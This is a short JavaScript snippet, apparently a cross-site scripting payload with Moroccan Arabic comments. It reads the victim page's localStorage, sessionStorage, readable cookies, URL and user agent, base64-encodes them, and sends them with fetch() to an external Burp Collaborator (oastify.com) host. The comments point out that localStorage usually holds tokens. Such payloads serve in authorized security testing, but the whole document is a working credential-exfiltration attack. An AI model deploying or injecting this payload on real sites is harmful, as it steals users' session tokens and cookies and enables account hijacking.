(async function() {
    let data = {
        url: window.location.href,
        userAgent: navigator.userAgent,
        localStorage: JSON.stringify(localStorage), // هادي غالبا فيها الـ Tokens
        sessionStorage: JSON.stringify(sessionStorage),
        cookie: document.cookie // غايجيب غير اللي ماشي HttpOnly
    };

    // إرسال البيانات مشفرة لـ Collaborator
    fetch("https://bq5fhfaet10n0yflkr53beqvbmhd58tx.oastify.com/?leak=" + btoa(unescape(encodeURIComponent(JSON.stringify(data)))));
})();
